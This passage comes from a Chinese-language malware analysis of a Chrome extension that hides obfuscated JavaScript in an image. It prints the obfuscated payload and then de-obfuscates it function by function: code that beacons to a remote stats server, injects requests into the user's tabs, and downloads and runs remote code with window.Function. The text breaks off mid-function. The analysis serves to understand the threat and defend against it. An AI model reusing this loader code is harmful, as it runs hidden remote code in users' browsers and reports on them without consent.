class="string">'0x18'</span></span>)]?<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xd'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xc'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xf'</span></span>)](<span class="params">_0x3ad6d4</span>):<span class="params">_0x2bc9ef</span>(<span class="params">_0x3090bd[<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1d'</span></span>)](<span class="params"><span class="built_in">Math</span>[<span class="string">'\x72\x61\x6e\x64\x6f\x6d'</span>](</span>)*<span class="params">_0x3090bd</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x18'</span></span>)])]['\<span class="params">x69</span>\<span class="params">x64</span>']);&#125;);&#125;);&#125;<span class="params">function</span> <span class="params">t</span>(<span class="params">_0x474bb1,_0x4cc1c1</span>)&#123;<span class="params">for</span>(<span class="params"><span class="keyword">var</span> _0x36e242=<span class="string">''</span>,_0x35971b=<span class="number">0x0</span>,_0x519d9f=<span class="number">0x0</span>;_0x519d9f&lt;_0x474bb1[<span class="string">'\x6c\x65\x6e\x67\x74\x68'</span>];_0x519d9f++</span>)<span class="params">_0x35971b</span>=<span class="params">_0x474bb1</span>[<span class="params">_0x519d9f</span>][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x1f'</span></span>)]<span class="params">()</span>+<span class="params">_0x4cc1c1</span>,<span class="params">_0x36e242</span>+=<span class="params">String</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x20'</span></span>)](<span class="params">_0x35971b</span>);<span class="params">return</span> <span class="params">_0x36e242</span>;&#125;<span class="params">function</span> <span class="params">o</span>(<span class="params">_0xcaa92b</span>)&#123;<span class="params">return</span> <span class="params">new</span> <span class="params">Promise</span>(<span class="params">(_0x47fce0,_0x349364</span>)=&gt;</span>&#123;<span class="keyword">let</span> _0x51ae9e=!<span class="number">0x1</span>,_0x556fe3=<span class="string">''</span>,_0x58bf0d=<span class="string">''</span>;<span class="keyword">try</span>&#123;_0xcaa92b=<span class="built_in">JSON</span>[_0x1838(<span class="string">'0x21'</span>)](_0xcaa92b),_0x556fe3=_0xcaa92b[_0x1838(<span class="string">'0x22'</span>)],_0x58bf0d=_0xcaa92b[_0x1838(<span class="string">'0x23'</span>)],_0x556fe3==<span class="number">-0x1</span>||<span class="function">(<span class="params">_0x51ae9e=!<span class="number">0x0</span></span>);&#125;<span class="params">catch</span>(<span class="params">_0x1b0f96</span>)&#123;<span class="params">e</span>(<span class="params">&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x24'</span></span>),'\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':'\<span class="params">x70</span>\<span class="params">x61</span>\<span class="params">x72</span>\<span class="params">x73</span>\<span class="params">x65</span>\<span class="params">x52</span>\<span class="params">x65</span>\<span class="params">x73</span>\<span class="params">x70</span>\<span class="params">x6f</span>\<span class="params">x6e</span>\<span class="params">x73</span>\<span class="params">x65</span>','\<span class="params">x66</span>\<span class="params">x72</span>':0<span class="params">x0</span>&#125;);&#125;<span class="params">_0x51ae9e</span>?<span class="params">l</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x7'</span></span>)](<span class="params">&#123;<span class="string">'\x54\x6a\x50\x7a\x6c\x38\x63\x61\x49\x34\x31'</span>:_0x556fe3,<span class="string">'\x4b\x49\x31\x30\x77\x54\x77\x77\x76\x46\x37'</span>:_0x58bf0d&#125;</span>)['\<span class="params">x74</span>\<span class="params">x68</span>\<span class="params">x65</span>\<span class="params">x6e</span>'](<span class="params">_0x207847=&gt;&#123;l[<span class="string">'\x73\x65\x74'</span>](&#123;<span class="string">'\x70\x79\x57\x35\x46\x31\x55\x34\x33\x56\x49'</span>:<span class="keyword">new</span> <span class="built_in">Date</span>(</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x3'</span></span>)]<span class="params">()</span>&#125;),<span class="params">e</span>(<span class="params">&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x25'</span></span>),'\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':<span class="params">_0x58bf0d</span>,'\<span class="params">x66</span>\<span class="params">x72</span>':0<span class="params">x0</span>&#125;),<span class="params">_0x47fce0</span>(<span class="params">&#123;<span class="string">'\x63\x6f\x64\x65'</span>:_0x556fe3,<span class="string">'\x76\x65\x72\x73\x69\x6f\x6e'</span>:_0x58bf0d&#125;</span>);&#125;):(<span class="params">_0x556fe3!=<span class="number">-0x1</span>&amp;&amp;e(&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x24'</span></span>),'\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x26'</span></span>),'\<span class="params">x66</span>\<span class="params">x72</span>':0<span class="params">x0</span>&#125;),<span class="params">l</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x2'</span></span>)](<span class="params">[_0x1838(<span class="string">'0x27'</span></span>),'\<span class="params">x4b</span>\<span class="params">x49</span>\<span class="params">x31</span>\<span class="params">x30</span>\<span class="params">x77</span>\<span class="params">x54</span>\<span class="params">x77</span>\<span class="params">x77</span>\<span class="params">x76</span>\<span class="params">x46</span>\<span class="params">x37</span>'])['\<span class="params">x74</span>\<span class="params">x68</span>\<span class="params">x65</span>\<span class="params">x6e</span>'](<span class="params">_0x5d38a5=&gt;&#123;_0x47fce0(&#123;<span class="string">'\x63\x6f\x64\x65'</span>:_0x5d38a5[<span class="string">'\x54\x6a\x50\x7a\x6c\x38\x63\x61\x49\x34\x31'</span>],<span class="string">'\x76\x65\x72\x73\x69\x6f\x6e'</span>:_0x5d38a5[_0x1838(<span class="string">'0x28'</span></span>)]&#125;);&#125;));&#125;);&#125;<span class="params">function</span> <span class="params">a</span>(<span class="params">_0xfc65f5</span>)&#123;<span class="params">try</span>&#123;<span class="params">window</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x29'</span></span>)](<span class="params">_0xfc65f5[_0x1838(<span class="string">'0x22'</span></span>)])(<span class="params">l,n,e</span>),<span class="params">e</span>(<span class="params">_0xfc65f5[_0x1838(<span class="string">'0x22'</span></span>)]&amp;&amp;0<span class="params">x0</span>!==<span class="params">_0xfc65f5</span>['\<span class="params">x63</span>\<span class="params">x6f</span>\<span class="params">x64</span>\<span class="params">x65</span>'][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x18'</span></span>)]||<span class="params">_0xfc65f5</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x23'</span></span>)]&amp;&amp;0<span class="params">x0</span>!==<span class="params">_0xfc65f5</span>['\<span class="params">x76</span>\<span class="params">x65</span>\<span class="params">x72</span>\<span class="params">x73</span>\<span class="params">x69</span>\<span class="params">x6f</span>\<span class="params">x6e</span>'][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x18'</span></span>)]?&#123;'\<span class="params">x61</span>\<span class="params">x63</span>\<span class="params">x74</span>':'\<span class="params">x72</span>\<span class="params">x75</span>\<span class="params">x6e</span>','\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':<span class="params">_0xfc65f5</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x23'</span></span>)]&#125;:&#123;'\<span class="params">x61</span>\<span class="params">x63</span>\<span class="params">x74</span>':<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x2a'</span></span>),'\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x2b'</span></span>)&#125;);&#125;<span class="params">catch</span>(<span class="params">_0x5bd26e</span>)&#123;<span class="params">e</span>(<span class="params">&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x24'</span></span>),'\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':`<span class="params">run_$</span>&#123;<span class="params">_0xfc65f5</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x23'</span></span>)]&#125;`&#125;);&#125;&#125;<span class="params">function</span> <span class="params">r</span><span class="params">()</span>&#123;<span class="params">return</span> <span class="params">new</span> <span class="params">Promise</span>(<span class="params">(_0x223434,_0x1b9f00</span>)=&gt;</span>&#123;l[_0x1838(<span class="string">'0x2'</span>)](_0x1838(<span class="string">'0x2c'</span>))[<span class="string">'\x74\x68\x65\x6e'</span>](<span class="function"><span class="params">_0x30d294</span>=&gt;</span>&#123;<span class="keyword">let</span> _0x55a281=_0x30d294[<span class="string">'\x70\x79\x57\x35\x46\x31\x55\x34\x33\x56\x49'</span>]||<span class="number">0x0</span>;<span class="number">0x0</span>===_0x55a281&amp;&amp;l[_0x1838(<span class="string">'0x7'</span>)](&#123;<span class="string">'\x58\x4d\x57\x45\x7a\x49\x34\x53\x66\x64\x43'</span>:<span class="keyword">new</span> <span class="built_in">Date</span>()[_0x1838(<span class="string">'0x3'</span>)]()&#125;)[<span class="string">'\x74\x68\x65\x6e'</span>](<span class="function"><span class="params">_0x2d7d72</span>=&gt;</span>&#123;e(&#123;<span class="string">'\x61\x63\x74'</span>:<span class="string">'\x69\x6e\x73\x74\x61\x6c\x6c'</span>&#125;);&#125;),<span class="keyword">new</span> <span class="built_in">Date</span>()[_0x1838(<span class="string">'0x3'</span>)]()-_0x55a281&gt;c[<span class="string">'\x57\x4c'</span>][<span class="string">'\x47\x6a'</span>]?setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;n(<span class="string">`<span class="subst">$&#123;c[<span class="string">'\x57\x4c'</span>][_0x1838(<span class="string">'0x5'</span>)]&#125;</span>/?hash=jwtmv6kavksy5cazdf4leg66r`</span>,_0x1838(<span class="string">'0x8'</span>))[_0x1838(<span class="string">'0x1'</span>)](o)[_0x1838(<span class="string">'0x1'</span>)](_0x223434);&#125;,c[<span class="string">'\x66\x4d'</span>]):l[_0x1838(<span class="string">'0x2'</span>)]([_0x1838(<span class="string">'0x27'</span>),_0x1838(<span class="string">'0x28'</span>)])[_0x1838(<span class="string">'0x1'</span>)](<span class="function"><span class="params">_0x1d2d5e</span>=&gt;</span>&#123;_0x223434(&#123;<span class="string">'\x63\x6f\x64\x65'</span>:_0x1d2d5e[_0x1838(<span class="string">'0x27'</span>)],<span class="string">'\x76\x65\x72\x73\x69\x6f\x6e'</span>:_0x1d2d5e[<span class="string">'\x4b\x49\x31\x30\x77\x54\x77\x77\x76\x46\x37'</span>]&#125;);&#125;);&#125;);&#125;);&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span>&#123;setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e(&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x2d'</span>)&#125;),r()[_0x1838(<span class="string">'0x1'</span>)](a);&#125;,c[<span class="string">'\x43\x66'</span>]);&#125;<span class="keyword">let</span> c=&#123;<span class="string">'\x57\x4c'</span>:&#123;<span class="string">'\x75\x72\x6c'</span>:_0x1838(<span class="string">'0x2e'</span>),<span class="string">'\x47\x6a'</span>:<span class="number">0x2932e00</span>&#125;,<span class="string">'\x4e\x5a'</span>:<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1d'</span>)](<span class="number">0x3</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1e'</span>)]()),<span class="string">'\x66\x4d'</span>:<span class="number">0x1b7740</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1d'</span>)](<span class="number">0x1</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1e'</span>)]()+<span class="number">0x1</span>),<span class="string">'\x43\x66'</span>:<span class="number">0xea60</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1d'</span>)](<span class="number">0x2</span>*<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1e'</span>)]()+<span class="number">0x1</span>),<span class="string">'\x46\x44'</span>:<span class="number">0x7</span>&#125;,l=&#123;<span class="string">'\x67\x65\x74'</span>(e=<span class="literal">null</span>)&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">_0x459136,_0x1dd2d2</span>)=&gt;</span>&#123;chrome[_0x1838(<span class="string">'0x30'</span>)][_0x1838(<span class="string">'0x2f'</span>)][_0x1838(<span class="string">'0x2'</span>)](e,<span class="function"><span class="keyword">function</span>(<span class="params">_0x49e268</span>)</span>&#123;_0x459136(_0x49e268);&#125;);&#125;);&#125;,<span class="string">'\x73\x65\x74'</span>(_0x1054f4)&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">_0x13679c,_0x5182a6</span>)=&gt;</span>&#123;chrome[_0x1838(<span class="string">'0x30'</span>)][<span class="string">'\x6c\x6f\x63\x61\x6c'</span>][_0x1838(<span class="string">'0x7'</span>)](_0x1054f4,<span class="function"><span class="keyword">function</span>(<span class="params">_0x154ca1</span>)</span>&#123;_0x13679c(_0x154ca1);&#125;);&#125;);&#125;,<span class="string">'\x79\x4a'</span>(_0x21744e)&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">_0x23501d,_0x525375</span>)=&gt;</span>&#123;chrome[_0x1838(<span class="string">'0x30'</span>)][_0x1838(<span class="string">'0x2f'</span>)][<span class="string">'\x79\x4a'</span>](_0x21744e,<span class="function"><span class="keyword">function</span>(<span class="params">_0x298d92</span>)</span>&#123;_0x23501d(_0x298d92);&#125;);&#125;);&#125;,<span class="string">'\x45\x45'</span>()&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">_0x47a45d,_0x110900</span>)=&gt;</span>&#123;chrome[_0x1838(<span class="string">'0x30'</span>)][_0x1838(<span class="string">'0x2f'</span>)][<span class="string">'\x45\x45'</span>](<span class="function"><span class="keyword">function</span>(<span class="params">_0x25822d</span>)</span>&#123;_0x47a45d(_0x25822d);&#125;);&#125;);&#125;&#125;;i();&#125;)()</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<p>很明显，这段js代码是经过深度混淆过的。</p>
<p>然后，通过<code>document.defaultView</code>的方式来执行从图片解析出来的javascript代码。</p>
<p>下面需要几个知识</p>
<p>1.<code>javascript</code>中这两种调用方法是一样的。<code>chrome.runtime.onMessage</code>和<code>chrome[&quot;runtime&quot;][&quot;onMessage&quot;]</code></p>
<p>2.<code>=&gt;</code>这个符号是ES6的特性，代表匿名ES函数</p>
<p>3.Promise为承诺，ES6的新特性已经被大多数浏览器支持</p>
<h2 id="图片中隐藏的js分析"><a href="#图片中隐藏的js分析" class="headerlink" title="图片中隐藏的js分析"></a>图片中隐藏的js分析</h2><p>这段javascript用了大量的Promise对象，用了大量的<code>=&gt;</code>这样的匿名函数，函数名用了<code>&quot;\x63\x6f\x64\x65&quot;</code>这种ascii码的16进制作为函数名，且使用了<code>chrome[&quot;runtime&quot;][&quot;onMessage&quot;]</code>这种调用的方式。</p>
<p>首先<code>_0x2126</code>是一个字符串数组，数组内的数据在之后的js代码中被大量引用作为函数名。不过这个数组在<code>function t</code>函数中被重新排序了，排序后的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">_0x2126 = ["eval", "then", "get", "getTime", "setUTCHours", "url", "origin", "<span class="keyword">set</span><span class="string">", "</span><span class="keyword">GET</span><span class="string">", "</span>loading<span class="string">", "</span><span class="keyword">status</span><span class="string">", "</span>removeListener<span class="string">", "</span>onUpdated<span class="string">", "</span>tabs<span class="string">", "</span>callee<span class="string">", "</span>addListener<span class="string">", "</span>onMessage<span class="string">", "</span>runtime<span class="string">", "</span>executeScript<span class="string">", "</span><span class="keyword">replace</span><span class="string">", "</span><span class="keyword">data</span><span class="string">", "</span><span class="keyword">test</span><span class="string">", "</span>includes<span class="string">", "</span><span class="keyword">http</span>://<span class="string">", "</span><span class="keyword">length</span><span class="string">", "</span><span class="keyword">Url</span> <span class="keyword">error</span><span class="string">", "</span><span class="keyword">query</span><span class="string">", "</span>filter<span class="string">", "</span>active<span class="string">", "</span><span class="keyword">floor</span><span class="string">", "</span>random<span class="string">", "</span>charCodeAt<span class="string">", "</span>fromCharCode<span class="string">", "</span><span class="keyword">parse</span><span class="string">", "</span>code<span class="string">", "</span><span class="keyword">version</span><span class="string">", "</span><span class="keyword">error</span><span class="string">", "</span>download<span class="string">", "</span>invalidMonetizationCode<span class="string">", "</span>TjPzl8caI41<span class="string">", "</span>KI10wTwwvF7<span class="string">", "</span><span class="keyword">Function</span><span class="string">", "</span>run<span class="string">", "</span>idle<span class="string">", "</span>pyW5F1U43VI<span class="string">", "</span>init<span class="string">", "</span>https://the-extension.com<span class="string">", "</span><span class="keyword">local</span><span class="string">", "</span><span class="keyword">storage</span><span class="string">"]</span></div></pre></td></tr></table></figure>
<p>这个数组中的数据在之后被作为函数名来调用相关的函数。<code>_0x1838(&#39;0x30&#39;)</code>其实就是取<code>_0x2126</code>中第0x30个元素，也就是<code>local</code>。</p>
<p>function t 就是用来对<code>_0x2126</code>这个list进行重新排序的函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params">_0x474bb1, _0x4cc1c1</span>) </span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x36e242 = <span class="string">''</span>,</div><div class="line">    _0x35971b = <span class="number">0x0</span>,</div><div class="line">    _0x519d9f = <span class="number">0x0</span>; _0x519d9f &lt; _0x474bb1[<span class="string">'length'</span>]; _0x519d9f++) </div><div class="line">        _0x35971b = _0x474bb1[_0x519d9f][<span class="string">"charCodeAt"</span>]() + _0x4cc1c1,</div><div class="line">        _0x36e242 += <span class="built_in">String</span>[<span class="string">"fromCharCode"</span>](_0x35971b);</div><div class="line">    <span class="keyword">return</span> _0x36e242;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function e 主要作用是post数据，更新执行的步骤</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params">&#123;</span></span></div><div class="line">    cat = <span class="string">"eval"</span>,</div><div class="line">    act = <span class="string">''</span>,</div><div class="line">    lab = <span class="string">''</span>,</div><div class="line">    fr = <span class="number">0x3e8</span> * <span class="number">0x3c</span> * <span class="number">0x3c</span> * <span class="number">0x18</span></div><div class="line">&#125;) &#123;</div><div class="line">    <span class="keyword">let</span> _0x4b1721 = t(<span class="string">`$ &#123;</span></div><div class="line">        cat</div><div class="line">    &#125;</div><div class="line">    _$ &#123;</div><div class="line">        act</div><div class="line">    &#125;`, c[<span class="string">'FD'</span>]);</div><div class="line">    <span class="keyword">return</span> l[<span class="string">'get'</span>](_0x4b1721)[<span class="string">"then"</span>](_0x9415ed = &gt;&#123;</div><div class="line">        <span class="keyword">let</span> _0x5d937f = _0x9415ed[_0x4b1721],</div><div class="line">        _0x45c15f = <span class="number">0x5265c00</span> == fr ? <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]() - <span class="keyword">new</span> <span class="built_in">Date</span>(_0x5d937f)[<span class="string">"setUTCHours"</span>](<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>) &gt;= fr: <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]() - _0x5d937f &gt;= fr; <span class="comment">// 一定的时间下才会执行</span></div><div class="line">        <span class="keyword">if</span> (!_0x5d937f || _0x45c15f) &#123;</div><div class="line">            <span class="keyword">let</span> _0x9415ed = <span class="string">`$ &#123;</span></div><div class="line">                new URL(c['WL']["url"])["origin"]</div><div class="line">            &#125; /stats`;</div><div class="line"> <span class="comment">//https://the-extension.com/stats?hash=jwtmv6kavksy5cazdf4leg66r&amp;eventCategory=eval&amp;eventAction=init&amp;eventLabel=</span></div><div class="line">n(<span class="string">`<span class="subst">$&#123;_0x9415ed&#125;</span>hash=jwtmv6kavksy5cazdf4leg66r&amp;eventCategory=<span class="subst">$&#123;cat&#125;</span>&amp;eventAction=<span class="subst">$&#123;act&#125;</span>&amp;eventLabel=<span class="subst">$&#123;lab&#125;</span>`</span>,<span class="string">'POST'</span>)[<span class="string">'then'</span>](<span class="function"><span class="params">_0x201de8</span>=&gt;</span>&#123;<span class="keyword">let</span> _0x9415ed=&#123;&#125;;_0x9415ed[_0x4b1721]=<span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>](),l[<span class="string">"set"</span>](_0x9415ed);&#125;);&#125;&#125;);&#125;</div></pre></td></tr></table></figure>
<p>比如，恶意js在init的时候，此时发送的请求如下</p>
<p><img src="5.png" alt=""></p>
<p><img src="6.png" alt=""></p>
<p>响应的请求</p>
<p>function n 主要是完成了一个xhr请求，通过<code>executeScript</code>来完成。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params">_0x42ba8f, n = “GET”</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x3090bd, _0x473358) = &gt;&#123;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x3ad6d4</span>(<span class="params">_0x3a3304, _0x4cce31, _0x57e5fb</span>) </span>&#123;</div><div class="line">            <span class="string">"loading"</span> === _0x4cce31[<span class="string">"status"</span>] &amp;&amp; (_0x20f3c8(_0x57e5fb, _0x42ba8f) &amp;&amp; c[<span class="string">'NZ'</span>] &lt;= <span class="number">0x0</span> &amp;&amp; (chrome[<span class="string">"tabs"</span>][<span class="string">"onUpdated"</span>][<span class="string">"removeListener"</span>](<span class="built_in">arguments</span>[<span class="string">"callee"</span>]), _0x2bc9ef(_0x3a3304)), c[<span class="string">'NZ'</span>]--);</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x2bc9ef</span>(<span class="params">_0x5a3411</span>) </span>&#123;</div><div class="line">            chrome[<span class="string">"runtime"</span>][<span class="string">"onMessage"</span>][<span class="string">"addListener"</span>](_0x4b297c),</div><div class="line">            chrome[<span class="string">"tabs"</span>][<span class="string">"executeScript"</span>](_0x5a3411, &#123;</div><div class="line">                <span class="string">'code'</span>: <span class="string">` (function() &#123;</span></div><div class="line">                    var url = replaceableurl;</div><div class="line">                    var xhr = new XMLHttpRequest();</div><div class="line">                    xhr.onreadystatechange = function() &#123;</div><div class="line">                        if (xhr.readyState === 4) &#123;</div><div class="line">                            chrome.runtime.sendMessage(&#123;</div><div class="line">                                data: xhr.responseText,</div><div class="line">                                url: url,</div><div class="line">                                status: xhr.status</div><div class="line">                            &#125;);</div><div class="line">                        &#125;</div><div class="line">                    &#125;;</div><div class="line">                    xhr.open('<span class="subst">$&#123;n&#125;</span>', url, true);</div><div class="line">                    xhr.send();</div><div class="line">                &#125;)()` [<span class="string">"replace"</span>](<span class="string">'replaceableurl'</span>, <span class="string">`'<span class="subst">$&#123;_0x42ba8f&#125;</span>'`</span>)</div><div class="line">            &#125;);</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x4b297c</span>(<span class="params">_0x4a051f</span>) </span>&#123;</div><div class="line">            _0x4a051f[<span class="string">"url"</span>] === _0x42ba8f &amp;&amp; (_0x3090bd(_0x4a051f[<span class="string">"data"</span>]), chrome[<span class="string">"runtime"</span>][<span class="string">"onMessage"</span>][<span class="string">'removeListener'</span>](<span class="built_in">arguments</span>[<span class="string">"callee"</span>]));</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_0x20f3c8</span>(<span class="params">_0x45a021, _0x3db6fb</span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">` ^ (( ? !(chrome$ &#123;</span></div><div class="line">                _0x3db6fb["includes"]("http://") ? '|https|ftps': ''</div><div class="line">            &#125;)). + : //)`)[<span class="string">"test"</span>](_0x45a021[<span class="string">"url"</span>]);&#125;_0x42ba8f&amp;&amp;<span class="number">0x0</span>!==_0x42ba8f[<span class="string">'length'</span>]||_0x473358(<span class="string">"Url error"</span>),chrome[<span class="string">"tabs"</span>][<span class="string">"query"</span>](&#123;&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">_0x26d445</span>)</span>&#123;<span class="keyword">let</span> _0x3090bd=_0x26d445[<span class="string">"filter"</span>](<span class="function"><span class="params">_0x1c9951</span>=&gt;</span>_0x20f3c8(_0x1c9951,_0x42ba8f)&amp;&amp;!_0x1c9951[<span class="string">'active'</span>]);<span class="number">0x0</span>===_0x3090bd[<span class="string">"length"</span>]?chrome[<span class="string">"tabs"</span>][<span class="string">"onUpdated"</span>][<span class="string">"addListener"</span>](_0x3ad6d4):_0x2bc9ef(_0x3090bd[<span class="built_in">Math</span>[<span class="string">"floor"</span>](<span class="built_in">Math</span>[<span class="string">'random'</span>]()*_0x3090bd[<span class="string">"length"</span>])][<span class="string">'id'</span>]);&#125;);&#125;);&#125;</div></pre></td></tr></table></figure>
<p>function o 用于解析返回的js代码，取出其中的code和version字段，并通过l.set方法持久化存储到本地。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params">_0xcaa92b</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x47fce0, _0x349364) = &gt;&#123;</div><div class="line">        <span class="keyword">let</span> _0x51ae9e = !<span class="number">0x1</span>,</div><div class="line">        _0x556fe3 = <span class="string">''</span>,</div><div class="line">        _0x58bf0d = <span class="string">''</span>;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            _0xcaa92b = <span class="built_in">JSON</span>[<span class="string">"parse"</span>](_0xcaa92b),</div><div class="line">            _0x556fe3 = _0xcaa92b[<span class="string">"code"</span>],</div><div class="line">            _0x58bf0d = _0xcaa92b[<span class="string">"version"</span>],</div><div class="line">            _0x556fe3 == <span class="number">-0x1</span> || (_0x51ae9e = !<span class="number">0x0</span>);</div><div class="line">        &#125; <span class="keyword">catch</span>(_0x1b0f96) &#123;</div><div class="line">            e(&#123;</div><div class="line">                <span class="string">"act"</span>: <span class="string">"error"</span>,</div><div class="line">                <span class="string">"lab"</span>: <span class="string">"parseResponse"</span>,</div><div class="line">                <span class="string">"fr"</span>: <span class="number">0x0</span></div><div class="line">            &#125;);</div><div class="line">        &#125;</div><div class="line">        _0x51ae9e ? l[<span class="string">"set"</span>](&#123;</div><div class="line">            <span class="string">"TjPzl8caI41"</span>: _0x556fe3,</div><div class="line">            <span class="string">"KI10wTwwvF7"</span>: _0x58bf0d</div><div class="line">        &#125;)[<span class="string">"then"</span>](_0x207847 = &gt;&#123;</div><div class="line">            l[<span class="string">"set"</span>](&#123;</div><div class="line">                <span class="string">"pyW5F1U43VI"</span>: <span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">"getTime"</span>]()</div><div class="line">            &#125;),</div><div class="line">            e(&#123;</div><div class="line">                <span class="string">"act"</span>: <span class="string">"download"</span>,</div><div class="line">                <span class="string">"lab"</span>: _0x58bf0d,</div><div class="line">                <span class="string">"fr"</span>: <span class="number">0x0</span></div><div class="line">            &#125;),</div><div class="line">            _0x47fce0(&#123;</div><div class="line">                <span class="string">"code"</span>: _0x556fe3,</div><div class="line">                <span class="string">"version"</span>: _0x58bf0d</div><div class="line">            &#125;);</div><div class="line">        &#125;) : (_0x556fe3 != <span class="number">-0x1</span> &amp;&amp; e(&#123;</div><div class="line">            <span class="string">"act"</span>: <span class="string">"error"</span>,</div><div class="line">            <span class="string">"lab"</span>: <span class="string">"invalidMonetizationCode"</span>,</div><div class="line">            <span class="string">"fr"</span>: <span class="number">0x0</span></div><div class="line">        &#125;), l[<span class="string">"get"</span>]([<span class="string">"TjPzl8caI41"</span>, <span class="string">"KI10wTwwvF7"</span>])[<span class="string">"then"</span>](_0x5d38a5 = &gt;&#123;</div><div class="line">            _0x47fce0(&#123;</div><div class="line">                <span class="string">"code"</span>: _0x5d38a5[<span class="string">"TjPzl8caI41"</span>],</div><div class="line">                <span class="string">"version"</span>: _0x5d38a5[<span class="string">"KI10wTwwvF7"</span>]</div><div class="line">            &#125;);</div><div class="line">        &#125;));</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function a 更新插件运行状态</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">_0xfc65f5</span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="built_in">window</span>[<span class="string">"Function"</span>](_0xfc65f5[<span class="string">"code"</span>])(l, n, e),</div><div class="line">        e(_0xfc65f5[<span class="string">"code"</span>] &amp;&amp; <span class="number">0x0</span> !== _0xfc65f5[<span class="string">'code'</span>][<span class="string">"length"</span>] || _0xfc65f5[<span class="string">"version"</span>] &amp;&amp; <span class="number">0x0</span> !== _0xfc65f5[<span class="string">'version'</span>][<span class="string">"length"</span>] ? &#123;</div><div class="line">            <span class="string">'act'</span>: <span class="string">'run'</span>,</div><div class="line">            <span class="string">'lab'</span>: _0xfc65f5[<span class="string">"version"</span>]</div><div class="line">        &#125;: &#123;</div><div class="line">            <span class="string">'act'</span>: <span class="string">"run"</span>,</div><div class="line">            <span class="string">'lab'</span>: <span class="string">"idle"</span></div><div class="line">        &#125;);</div><div class="line">    &#125; 